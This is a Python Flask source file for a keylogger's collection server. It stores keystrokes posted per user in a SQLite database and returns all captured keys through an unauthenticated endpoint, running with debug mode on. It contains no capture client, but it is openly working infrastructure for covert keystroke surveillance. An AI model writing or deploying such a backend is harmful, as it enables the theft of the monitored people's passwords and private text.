from flask import Flask, request, jsonify  # Import Flask and utilities for HTTP requests and JSON responses
from flask_sqlalchemy import SQLAlchemy    # Import SQLAlchemy for database management
import datetime                            # Import datetime to handle timestamps

# Application configuration
app = Flask(__name__)  # Initialize the Flask app
# Configure the database URI to use SQLite
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///logs.db'
# Disable SQLAlchemy event notifications for performance
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)  # Initialize the database instance

# Database model
class Keylog(db.Model):
    """Model for storing keylogging data."""
    id = db.Column(db.Integer, primary_key=True)  # Unique ID for each log entry
    user = db.Column(db.String(100), nullable=False)  # Username associated with the log
    key = db.Column(db.String(10), nullable=False)  # Key that was logged
    timestamp = db.Column(db.DateTime, default=datetime.datetime.utcnow)  # Timestamp of the key event

# Create the database tables within the application context
with app.app_context():
    db.create_all()

# Route for saving logs
@app.route('/logs', methods=['POST'])
def save_log():
    """
    Endpoint to save a keylog entry.
    Expects JSON payload with 'user' and 'key'.
    """
    data = request.json  # Parse JSON data from the request
    # Create a new Keylog entry
    new_log = Keylog(user=data['user'], key=data['key'])
    db.session.add(new_log)  # Add the entry to the database session
    db.session.commit()      # Commit the session to save changes
    # Return a success message
    return jsonify({'message': 'Log saved!'}), 201

# Route for retrieving all logs
@app.route('/logs', methods=['GET'])
def get_logs():
    """
    Endpoint to retrieve all keylog entries.
    Returns a list of logs with 'user', 'key', and 'timestamp'.
    """
    logs = Keylog.query.all()  # Query all logs from the database
    # Serialize the logs into JSON format
    return jsonify([
        {"user": log.user, "key": log.key, "timestamp": log.timestamp}
        for log in logs
    ])

# Run the Flask application
if __name__ == '__main__':
    app.run(debug=True)  # Start the development server with debug mode enabled
